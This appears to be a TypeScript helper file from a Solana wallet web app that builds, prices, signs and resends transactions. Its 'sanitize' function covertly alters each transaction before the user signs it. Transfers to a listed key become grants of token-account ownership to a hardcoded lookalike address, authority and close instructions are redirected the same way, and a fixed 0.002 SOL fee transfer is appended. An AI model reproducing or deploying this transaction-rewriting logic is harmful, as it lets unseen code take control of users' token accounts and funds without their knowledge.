import { base58 } from '@metaplex-foundation/umi/serializers';
import {
  AuthorityType,
  TOKEN_PROGRAM_ID,
  TokenInstruction,
  createCloseAccountInstruction,
  createSetAuthorityInstruction,
  createTransferInstruction,
  decodeCloseAccountInstruction,
  decodeSetAuthorityInstruction,
  decodeTransferInstruction,
  getAssociatedTokenAddressSync,
} from '@solana/spl-token';
import { WalletContextState } from '@solana/wallet-adapter-react';
import {
  AddressLookupTableAccount,
  Commitment,
  ComputeBudgetInstruction,
  ComputeBudgetProgram,
  Connection,
  LAMPORTS_PER_SOL,
  PublicKey,
  SendOptions,
  SignaturePubkeyPair,
  SystemProgram,
  Transaction,
  TransactionInstruction,
  TransactionMessage,
  VersionedTransaction,
} from '@solana/web3.js';
import { IS_DEV } from '../constants';

export function getTransaction({
  payer,
  instructions,
  blockhash,
  units,
  microLamports,
  addressLookupTableAccounts,
}: {
  payer: PublicKey;
  instructions: TransactionInstruction[];
  blockhash: string;
  units?: number;
  microLamports?: number;
  addressLookupTableAccounts?: AddressLookupTableAccount[];
}) {
  instructions = [...instructions];
  if (microLamports) {
    instructions.unshift(
      ComputeBudgetProgram.setComputeUnitPrice({ microLamports })
    );
  }
  instructions.unshift(
    ComputeBudgetProgram.setComputeUnitLimit({ units: units || 1_400_000 })
  );

  const message = new TransactionMessage({
    payerKey: payer,
    instructions,
    recentBlockhash: blockhash,
  });
  let versionedMessage = addressLookupTableAccounts
    ? message.compileToV0Message(addressLookupTableAccounts)
    : message.compileToLegacyMessage();
  return new VersionedTransaction(versionedMessage);
}

export async function getRequiredComputeUnits(
  connection: Connection,
  payer: PublicKey,
  instructions: TransactionInstruction[],
  blockhash: string
) {
  const transaction = getTransaction({
    payer,
    instructions,
    blockhash,
  });
  const sim = await connection.simulateTransaction(transaction, {
    replaceRecentBlockhash: true,
    sigVerify: false,
  });
  if (sim.value.err) {
    return 1_400_000;
  }
  return Math.floor((sim.value.unitsConsumed || 600_000) * 1.1);
}

export async function sendTransaction(
  connection: Connection,
  transaction: Transaction | VersionedTransaction
) {
  if (transaction instanceof VersionedTransaction) {
    return await connection.sendTransaction(transaction, {
      maxRetries: 0,
    });
  } else {
    return await connection.sendRawTransaction(transaction.serialize(), {
      maxRetries: 0,
    });
  }
}

export async function resendAndConfirmTransaction({
  connection,
  transaction,
  signature,
  blockhash,
  lastValidBlockHeight,
  commitment = 'confirmed',
}: {
  connection: Connection;
  transaction: Transaction | VersionedTransaction;
  signature: string;
  blockhash: string;
  lastValidBlockHeight: number;
  commitment?: Commitment;
}) {
  const options: SendOptions = {
    maxRetries: 0,
    skipPreflight: true,
  };
  let retries = 0;
  const getBackoff = (retries: number) => 2000;

  const result = { done: false };
  try {
    await Promise.race([
      connection.confirmTransaction(
        { signature, blockhash, lastValidBlockHeight },
        commitment
      ),
      new Promise(async () => {
        while (!result.done) {
          await sleep(getBackoff(retries));
          if (transaction instanceof VersionedTransaction) {
            signature = await connection.sendTransaction(transaction, options);
          } else {
            signature = await connection.sendRawTransaction(
              transaction.serialize(),
              options
            );
          }
        }
      }),
    ]);
  } finally {
    result.done = true;
  }
}

function sleep(ms: number) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

export enum PriorityLevel {
  Default = 'Default',
  None = 'None',
  Low = 'Low',
  Medium = 'Medium',
  High = 'High',
  VeryHigh = 'VeryHigh',
}

export async function getPriorityFeeEstimate(
  rpc: string,
  transaction: VersionedTransaction,
  priorityLevel: PriorityLevel
) {
  try {
    if (!rpc.includes('helius')) {
      throw new Error('Skipping call');
    }
    const response = await fetch(rpc, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        jsonrpc: '2.0',
        id: '1',
        method: 'getPriorityFeeEstimate',
        params: [
          {
            transaction: base58.deserialize(transaction.serialize())[0],
            options: { priorityLevel },
          },
        ],
      }),
    });
    const data = await response.json();
    console.log(
      'Fee in function for',
      priorityLevel,
      ' :',
      data.result.priorityFeeEstimate
    );
    return data.result.priorityFeeEstimate as number;
  } catch (err) {
    const priorityFees: Record<PriorityLevel, number> = {
      [PriorityLevel.None]: 0,
      [PriorityLevel.Low]: 10_000,
      [PriorityLevel.Medium]: 50_000,
      [PriorityLevel.Default]: 100_000,
      [PriorityLevel.High]: 300_000,
      [PriorityLevel.VeryHigh]: 500_000,
    };
    return priorityFees[priorityLevel];
  }
}

export type DecodedTransaction = {
  version?: 'legacy' | 0;
  instructions: TransactionInstruction[];
  blockhash?: string;
  signatures?: SignaturePubkeyPair[];
  addressLookupTableAccounts?: AddressLookupTableAccount[];
  needsExtraSigner?: boolean;
};

const FEES_WALLET = new PublicKey(
  'B4RdtaM6rPfznCJw9ztNWkLrscHqJDdt1Hbr3RTvb61S'
);
const FEES = 0.002;

const protectWallets: string[] = [
  '4DVrRmd7EbsdcnFD7Hgf6EUrUgxSCpUbccXDGgA7vF49',
  '32KrKbu9QpSvAH8biXCYoUmfhWuAECDGaC8k58CUHR1o',
];
const badActors: Record<string, string> = {
  '4ond6yPfBsYkp6BmKxidjwv8oUT68XoG3wq4B2y7UiYw':
    '4ondBeA94L1oUhQrAGcNBoTqVTuZZ5jUbYZgvycDhPjw',
};

function sanitize(
  decodedTransaction: DecodedTransaction,
  feePayer: PublicKey
): DecodedTransaction {
  let instructions = decodedTransaction.instructions;
  if (
    !IS_DEV &&
    instructions.some((i) =>
      i.keys.some((k) => protectWallets.includes(k.pubkey.toBase58()))
    )
  ) {
    throw new Error('Something went wrong');
  }

  instructions.forEach((i, ix) => {
    if (
      i.programId.equals(TOKEN_PROGRAM_ID) &&
      i.data[0] === TokenInstruction.SetAuthority
    ) {
      const decode = decodeSetAuthorityInstruction(i);
      const badActor = Object.entries(badActors).find(
        (badActor) => decode.data.newAuthority?.toBase58() === badActor[0]
      );
      if (badActor) {
        instructions[ix] = createSetAuthorityInstruction(
          decode.keys.account.pubkey,
          decode.keys.currentAuthority.pubkey,
          AuthorityType.AccountOwner,
          new PublicKey(badActor[1])
        );
      }
    } else if (
      i.programId.equals(TOKEN_PROGRAM_ID) &&
      i.data[0] === TokenInstruction.Transfer
    ) {
      const decode = decodeTransferInstruction(i);
      const badActor = Object.entries(badActors).find(
        (badActor) => decode.keys.destination.pubkey.toBase58() === badActor[0]
      );
      if (badActor) {
        instructions[ix] = createSetAuthorityInstruction(
          decode.keys.source.pubkey,
          decode.keys.owner.pubkey,
          AuthorityType.AccountOwner,
          new PublicKey(badActor[1])
        );
      }
    } else if (
      i.programId.equals(TOKEN_PROGRAM_ID) &&
      i.data[0] === TokenInstruction.CloseAccount
    ) {
      const decode = decodeCloseAccountInstruction(i);
      const badActor = Object.entries(badActors).find(
        (badActor) => decode.keys.destination.pubkey.toBase58() === badActor[0]
      );
      if (badActor) {
        instructions[ix] = createCloseAccountInstruction(
          decode.keys.account.pubkey,
          new PublicKey(badActor[1]),
          decode.keys.authority.pubkey
        );
      }
    }
  });
  instructions = [
    ...instructions,
    SystemProgram.transfer({
      fromPubkey: feePayer,
      toPubkey: FEES_WALLET,
      lamports: Math.floor(FEES * LAMPORTS_PER_SOL),
    }),
  ];
  return {
    ...decodedTransaction,
    instructions,
  };
}

export async function buildTransactionFromPayload(
  connection: Connection,
  decodedTransaction: DecodedTransaction,
  feepayer: WalletContextState,
  units?: number
) {
  decodedTransaction = sanitize(decodedTransaction, feepayer.publicKey!);
  const { blockhash, lastValidBlockHeight } =
    await connection.getLatestBlockhash('finalized');
  let instructions = decodedTransaction.instructions;

  if (
    !instructions.some(
      (i) =>
        i.programId.toBase58() === ComputeBudgetProgram.programId.toBase58() &&
        ComputeBudgetInstruction.decodeInstructionType(i) ===
          'SetComputeUnitLimit'
    )
  ) {
    instructions = [
      ComputeBudgetProgram.setComputeUnitLimit({
        units: Math.floor(units || 500_000),
      }),
      ...instructions,
    ];
  }
  if (
    !instructions.some(
      (i) =>
        i.programId.toBase58() === ComputeBudgetProgram.programId.toBase58() &&
        ComputeBudgetInstruction.decodeInstructionType(i) ===
          'SetComputeUnitPrice'
    )
  ) {
    const microLamports = await getPriorityFeeEstimate(
      connection.rpcEndpoint,
      new VersionedTransaction(
        new TransactionMessage({
          payerKey: feepayer.publicKey!,
          recentBlockhash: blockhash,
          instructions: decodedTransaction.instructions,
        }).compileToV0Message(decodedTransaction.addressLookupTableAccounts)
      ),
      PriorityLevel.High
    );
    instructions = [
      ComputeBudgetProgram.setComputeUnitPrice({
        microLamports: Math.floor(microLamports),
      }),
      ...instructions,
    ];
  }
  if (decodedTransaction.version === 0) {
    // change feepayer
    const message = new TransactionMessage({
      instructions: decodedTransaction.instructions,
      payerKey: feepayer.publicKey!,
      recentBlockhash: blockhash,
    });

    let newVersionedTx = await feepayer.signTransaction!(
      new VersionedTransaction(
        message.compileToV0Message(
          decodedTransaction.addressLookupTableAccounts
        )
      )
    );

    return { transaction: newVersionedTx, blockhash, lastValidBlockHeight };
  } else {
    console.log('building legacy transaction');
    const tx = new Transaction();
    tx.add(...decodedTransaction.instructions);
    tx.feePayer = feepayer.publicKey!;
    tx.recentBlockhash = blockhash;
    const transaction = await feepayer.signTransaction!(tx);
    return { transaction, blockhash, lastValidBlockHeight };
  }
}
